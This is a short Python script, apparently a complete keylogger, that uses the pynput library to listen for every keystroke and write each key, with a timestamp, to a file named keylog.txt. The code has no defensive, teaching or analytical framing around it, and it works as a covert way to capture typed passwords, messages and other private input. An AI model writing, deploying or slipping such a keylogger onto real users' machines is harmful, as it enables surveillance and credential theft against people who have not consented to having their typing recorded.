from pynput import keyboard
import logging


log_file = "keylog.txt"
logging.basicConfig(
    filename=log_file,
    level=logging.DEBUG,
    format='%(asctime)s: %(message)s'
)

def on_press(key):
    try:
        logging.info(f'Key {key.char} pressed')
    except AttributeError:
        logging.info(f'Special key {key} pressed')

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
